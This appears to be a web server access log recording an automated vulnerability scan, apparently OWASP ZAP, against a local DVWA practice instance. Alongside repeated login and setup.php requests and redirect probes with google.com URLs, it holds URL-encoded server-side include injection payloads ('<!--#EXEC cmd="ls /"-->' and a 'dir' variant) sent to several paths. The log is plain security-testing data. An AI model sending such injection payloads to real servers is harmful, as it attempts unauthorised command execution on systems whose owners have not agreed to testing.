172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=www.google.com%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=www.google.com%3A80%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=www.google.com HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=www.google.com%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /sitemap.xml?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=www.google.com%3A80%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=www.google.com HTTP/1.1" 302 300 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /about.php?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /about.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /about.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /about.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 301 612 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/DVWA_v1.3.pdf?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 301 630 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 301 614 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 301 632 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/DVWA_v1.3.pdf?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/DVWA_v1.3.pdf?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 301 612 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa/?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
